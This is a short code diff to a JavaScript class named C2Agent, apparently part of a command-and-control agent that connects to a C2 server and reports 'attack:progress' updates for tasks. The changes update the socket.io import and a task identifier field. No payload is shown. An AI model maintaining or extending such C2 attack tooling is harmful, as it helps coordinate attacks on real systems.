@@ -1,4 +1,4 @@
-import socketIOClient from 'socket.io-client';
+import { io } from 'socket.io-client';
 import os from 'os';
 import crypto from 'crypto';
 import axios from 'axios';
@@ -85,7 +85,7 @@ export class C2Agent {
     }
 
     connectWebSocket() {
-        this.socket = socketIOClient(this.config.c2Url, {
+        this.socket = io(this.config.c2Url, {
             transports: ['websocket'],
             reconnection: true,
             reconnectionDelay: this.config.reconnectInterval
@@ -161,7 +161,7 @@ export class C2Agent {
                     // Send progress to C2 server
                     if (this.socket && this.socket.connected) {
                         this.socket.emit('attack:progress', {
-                            attackId: task.attackId,
+                            attackId: task.id,
                             taskId: task.id,
                             progress: data.stats
                         });
